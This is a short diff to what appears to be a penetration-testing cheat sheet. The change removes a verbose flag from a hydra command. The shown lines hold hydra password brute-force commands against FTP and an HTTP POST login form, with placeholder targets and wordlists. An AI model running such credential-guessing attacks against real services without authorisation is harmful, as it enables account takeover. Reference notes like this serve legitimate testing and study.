@@ -446,7 +446,7 @@ hydra -l <user> -P <wordliist> <IP> ftp://<IP>
 ```
 post form
 ```
-hydra -I -L <wordlist> -P <wordliist> <IP> http-post-form '/src/login.php:login_username=^USER^&user_pass=^PASS^:F=incorrect' -v
+hydra -I -L <wordlist> -P <wordliist> <IP> http-post-form '/src/login.php:login_username=^USER^&user_pass=^PASS^:F=incorrect'
 ```
 https://github.com/vanhauser-thc/thc-hydra
 
